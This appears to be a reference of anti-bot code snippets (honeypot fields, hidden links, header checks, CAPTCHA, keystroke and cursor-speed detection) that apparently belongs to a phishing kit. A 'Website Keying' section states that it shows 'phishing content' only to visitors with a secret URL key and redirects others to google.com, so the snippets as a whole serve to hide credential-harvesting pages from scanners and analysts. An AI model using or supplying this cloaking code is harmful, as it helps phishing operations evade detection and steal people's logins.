# Anti-Bot Techniques Reference

## Honeypots

### Hidden Form Field
Add an invisible input field. Bots auto-fill all fields; humans never see it.
```html
<input type="text" name="website" style="display:none;" tabindex="-1" autocomplete="off">
```
```php
<?php
if (!empty($_POST['website'])) {
    header('Location: blocked.php'); exit;
}
?>
```

### Hidden Link Honeypot
Place an invisible link. Bots follow all links; humans don't see it.
```html
<a href="conduct.php" style="display:none;position:absolute;left:-9999px;">Terms</a>
```
`conduct.php` logs the IP and blocks it.

### Required HTTP Header
Require a custom header set by JS. Command-line tools won't set it.
```html
<script>
document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault();
    fetch('login.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'legitimate' },
        body: new URLSearchParams(new FormData(this))
    }).then(r => window.location = r.url);
});
</script>
```
```php
<?php
if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) || $_SERVER['HTTP_X_REQUESTED_WITH'] !== 'legitimate') {
    header('Location: blocked.php'); exit;
}
?>
```

---

## CAPTCHA

### Google reCAPTCHA v2
```html
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<form action="verify.php" method="POST">
    <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
    <button type="submit">Submit</button>
</form>
```
```php
<?php
$secret = 'YOUR_SECRET_KEY';
$response = $_POST['g-recaptcha-response'];
$verify = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret={$secret}&response={$response}");
$result = json_decode($verify, true);
if (!$result['success']) {
    header('Location: blocked.php'); exit;
}
?>
```

### Custom Invisible CAPTCHA
Generate a math challenge server-side, validate on submit:
```php
<?php
session_start();
$a = rand(1, 10); $b = rand(1, 10);
$_SESSION['captcha_answer'] = $a + $b;
?>
<form action="verify.php" method="POST">
    <input type="hidden" id="captcha" name="captcha">
    <button type="submit">Login</button>
</form>
<script>
document.getElementById('captcha').value = <?php echo $a; ?> + <?php echo $b; ?>;
</script>
```

---

## Website Keying

Only show phishing content if the correct URL parameter is present.

### Single Key
```php
<?php
$validKey = 'abc123xyz';
if (!isset($_GET['key']) || $_GET['key'] !== $validKey) {
    header('Location: https://google.com'); exit;
}
?>
```

### Multi-Key with JSON Validation
```php
<?php
$validKeys = json_decode(file_get_contents('/var/www/valid_keys.json'), true);
$requestKey = $_GET['id'] ?? '';
$requestToken = $_GET['token'] ?? '';
$valid = false;
foreach ($validKeys as $entry) {
    if ($entry['id'] === $requestKey && $entry['token'] === $requestToken) {
        $valid = true; break;
    }
}
if (!$valid) { header('Location: https://google.com'); exit; }
?>
```

---

## User Interaction Analysis

### Keystroke Speed Detection
Detect automated input (bots type instantly, humans have 50-300ms gaps):
```javascript
var lastKeyTime = 0;
var fastKeyCount = 0;
document.getElementById('password').addEventListener('keydown', function() {
    var now = Date.now();
    if (lastKeyTime > 0 && (now - lastKeyTime) < 15) {
        fastKeyCount++;
    }
    lastKeyTime = now;
    if (fastKeyCount > 3) {
        console.log("Bot detected: superhuman typing speed");
    }
});
```

### Cursor Speed Detection
```javascript
var lastX = 0, lastY = 0, lastTime = 0;
document.addEventListener('mousemove', function(e) {
    var now = Date.now();
    if (lastTime > 0) {
        var dist = Math.sqrt(Math.pow(e.clientX - lastX, 2) + Math.pow(e.clientY - lastY, 2));
        var time = now - lastTime;
        var speed = dist / time;
        if (speed > 50) {
            console.log("Inhuman cursor speed detected");
        }
    }
    lastX = e.clientX; lastY = e.clientY; lastTime = now;
});
```

### Right-Click Detection
```javascript
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    console.log("Right-click blocked");
});
```

### User Inactivity Detection
```javascript
var inactivityTimer;
function resetTimer() {
    clearTimeout(inactivityTimer);
    inactivityTimer = setTimeout(function() {
        document.body.innerHTML = '<h2>Session expired</h2>';
    }, 60000);
}
['mousemove', 'keypress', 'click', 'scroll'].forEach(function(evt) {
    document.addEventListener(evt, resetTimer);
});
resetTimer();
```

### Character Whitelisting
Only allow characters typical of email/password fields:
```javascript
document.getElementById('username').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^a-zA-Z0-9@._\-]/g, '');
});
```

### Wipe Form + Blacklist on Suspicious Input
```javascript
function wipeAndBlock() {
    document.querySelector('form').reset();
    fetch('block.php', { method: 'POST' });
    window.location = 'https://google.com';
}
```
